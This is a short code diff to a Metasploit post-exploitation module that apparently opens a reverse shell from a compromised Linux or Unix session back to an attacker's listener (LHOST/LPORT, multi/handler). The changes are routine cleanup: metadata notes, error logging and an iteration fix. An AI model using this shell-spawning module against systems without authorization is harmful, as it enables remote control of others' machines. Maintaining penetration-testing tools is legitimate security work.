@@ -18,7 +18,12 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
         'Platform' => %w[linux osx unix],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options(
@@ -37,7 +42,6 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
     create_multihand(datastore['LHOST'], datastore['LPORT']) if datastore['HANDLER']
     lhost = datastore['LHOST']
@@ -57,7 +61,8 @@ class MetasploitModule < Msf::Post
       when /bash/i
         cmd = bash_session(lhost, lport)
       end
-    rescue StandardError
+    rescue StandardError => e
+      vprint_error(e.message)
     end
 
     if !cmd.empty?
@@ -100,7 +105,7 @@ class MetasploitModule < Msf::Post
   # will return true if a conflict exists and false if none is found
   def check_for_listner(lhost, lport)
     conflict = false
-    client.framework.jobs.each do |_k, j|
+    client.framework.jobs.each_value do |j|
       next unless j.name =~ %r{ multi/handler}
 
       current_id = j.jid
